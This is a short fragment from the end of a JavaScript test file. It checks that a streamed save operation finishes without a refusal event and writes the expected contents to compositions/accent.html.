        expect(stream).not.toContain("event: refusal");
        expect(terminal(stream)).toMatchObject({ type: "complete", verdict: "saved" });
        expect(readFileSync(join(setup.projectDir, "compositions/accent.html"), "utf-8")).toBe(
          block,
        );
      });
    });
  });
});
